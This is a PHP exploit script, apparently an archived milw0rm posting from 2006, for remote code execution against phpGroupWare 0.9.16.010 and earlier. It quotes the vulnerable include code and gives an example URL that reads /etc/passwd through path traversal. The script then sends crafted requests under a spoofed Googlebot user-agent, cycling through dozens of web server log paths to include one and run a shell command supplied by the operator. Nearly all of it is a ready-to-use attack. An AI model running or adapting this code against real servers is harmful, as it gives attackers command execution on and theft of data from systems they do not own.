#!/usr/bin/php -q -d short_open_tag=on
<?
/*
this works against register_globals=On
and magic quotes = off :) /str0ke
*/
/*
vulnerable code => calendar/inc/class.holidaycalc.inc.php line 14-33:
....
  /* $Id: class.holidaycalc.inc.php,v 1.5 2001/08/26 12:32:28 skeeter Exp $ */

	if (empty($GLOBALS['phpgw_info']['user']['preferences']['common']['country']))
	{
		$rule = 'US';
	}
	else
	{
		$rule = $GLOBALS['phpgw_info']['user']['preferences']['common']['country'];
	}

	$calc_include = PHPGW_INCLUDE_ROOT.'/calendar/inc/class.holidaycalc_'.$rule.'.inc.php';
	if(@file_exists($calc_include))
	{
		include($calc_include);
	}
	else
	{
		include(PHPGW_INCLUDE_ROOT.'/calendar/inc/class.holidaycalc_US.inc.php');
	}
....

ex: 
http://www.site.com/[phpGroupWare_path]/calendar/inc/class.holidaycalc.inc.php?GLOBALS[phpgw_info][user][preferences][common][country]=../../../../../../../../../etc/passwd%00
*/

echo "+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~";
echo "+\r\n";
echo "-   - - [DEVIL TEAM THE BEST POLISH TEAM] - -\r\n\r\n";
echo "+\r\n";
echo "+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\"\r\n";
echo "+\r\n\r\n";
echo "- phpGroupWare <= 0.9.16.010 GLOBALS[] Remote Code Execution Exploit"\r\n";
echo "+"\r\n";
echo "+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"\r\n";
echo "+"\r\n";
echo "- [Script name: phpGroupWare v. 0.9.16.010"\r\n";
echo "- [Script site: http://sourceforge.net/projects/phpgroupware/"\r\n";
echo "+"\r\n";
echo "+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"\r\n";
echo "+"\r\n";
echo "-          Find by: Kacper (a.k.a Rahim)"\r\n";
echo "+"\r\n";
echo "-          Contact: kacper1964@yahoo.pl"\r\n";
echo "-                        or"\r\n";
echo "-           http://www.rahim.webd.pl/"\r\n";
echo "+"\r\n";
echo "+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\"\r\n";
echo "+"\r\n";
echo "- Special Greetz: DragonHeart ;-)"\r\n";
echo "- Ema: Leito, Adam, DeathSpeed, Drzewko, pepi, nukedclx, mivus ;]"\r\n";
echo "+"\r\n";
echo "!@ Przyjazni nie da sie zamienic na marne korzysci @!"\r\n";
echo "+"\r\n";
echo "+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\"\r\n";
echo "+"\r\n";
echo "-            Z Dedykacja dla osoby,"\r\n";
echo "-         bez ktorej nie mogl bym zyc..."\r\n";
echo "-           K.C:* J.M (a.k.a Magaja)"\r\n";
echo "+"\r\n";
echo "+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\"\r\n";
if ($argc<4) {
echo "Usage: php ".$argv[0]." host path cmd options\r\n";
echo "host:      target server (ip/hostname)\r\n";
echo "path:      path to PHPList\r\n";
echo "cmd:       a shell command\r\n";
echo "Options:\r\n";
echo "   -p[port]:    specify a port other than 80\r\n";
echo "   -P[ip:port]: specify a proxy\r\n";
echo "Examples:\r\n";
echo "php ".$argv[0]." localhost /lists/ cat ./config/config.php\r\n";
echo "php ".$argv[0]." localhost /lists/ ls -la -p81\r\n";
echo "php ".$argv[0]." localhost / ls -la -P1.1.1.1:80\r\n";
die;
}
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);
function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;
}
function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host=$argv[1];
$path=$argv[2];
$cmd="";$port=80;$proxy="";

for ($i=3; $i<=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P"))
{$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
$cmd=urlencode($cmd);
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$paths=array(
"../../../../../../../../../../../../var/log/httpd/access_log",
"../../../../../../../../../../../../var/log/httpd/error_log",
"../../../apache/logs/error.log",
"../../../apache/logs/access.log",
"../../../../apache/logs/error.log",
"../../../../apache/logs/access.log",
"../../../../../apache/logs/error.log",
"../../../../../apache/logs/access.log",
"../../../../../../apache/logs/error.log",
"../../../../../../apache/logs/access.log",
"../../../../../../../apache/logs/error.log",
"../../../../../../../apache/logs/access.log",
"../../../../../../../../apache/logs/error.log",
"../../../../../../../../apache/logs/access.log",
"../../../logs/error.log",
"../../../logs/access.log",
"../../../../logs/error.log",
"../../../../logs/access.log",
"../../../../../logs/error.log",
"../../../../../logs/access.log",
"../../../../../../logs/error.log",
"../../../../../../logs/access.log",
"../../../../../../../logs/error.log",
"../../../../../../../logs/access.log",
"../../../../../../../../logs/error.log",
"../../../../../../../../logs/access.log",
"../../../../../../../../../../../../etc/httpd/logs/acces_log",
"../../../../../../../../../../../../etc/httpd/logs/acces.log",
"../../../../../../../../../../../../etc/httpd/logs/error_log",
"../../../../../../../../../../../../etc/httpd/logs/error.log",
"../../../../../../../../../../../../var/www/logs/access_log",
"../../../../../../../../../../../../var/www/logs/access.log",
"../../../../../../../../../../../../usr/local/apache/logs/access_log",
"../../../../../../../../../../../../usr/local/apache/logs/access.log",
"../../../../../../../../../../../../var/log/apache/access_log",
"../../../../../../../../../../../../var/log/apache/access.log",
"../../../../../../../../../../../../var/log/access_log",
"../../../../../../../../../../../../var/www/logs/error_log",
"../../../../../../../../../../../../var/www/logs/error.log",
"../../../../../../../../../../../../usr/local/apache/logs/error_log",
"../../../../../../../../../../../../usr/local/apache/logs/error.log",
"../../../../../../../../../../../../var/log/apache/error_log",
"../../../../../../../../../../../../var/log/apache/error.log",
"../../../../../../../../../../../../var/log/access_log",
"../../../../../../../../../../../../var/log/error_log"
);
for ($i=0; $i<=count($paths)-1; $i++)
{
$a=$i+2;
echo "[".$a."] PATH: ".$paths[$i]."\r\n";
$packet ="GET ".$p."calendar/inc/class.holidaycalc.inc.php?GLOBALS[phpgw_info][user][preferences][common][country]=".$paths[$i]."%00&cmd=".$cmd." HTTP/1.0\r\n";
$packet.="User-Agent: Googlebot/2.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
if (strstr($html,"56789"))
{
 $temp=explode("56789",$html);
 echo $temp[1];
 echo "\r\nExploit succeeded...\r\n";
 die;
}
}
?>

# milw0rm.com [2006-08-29]
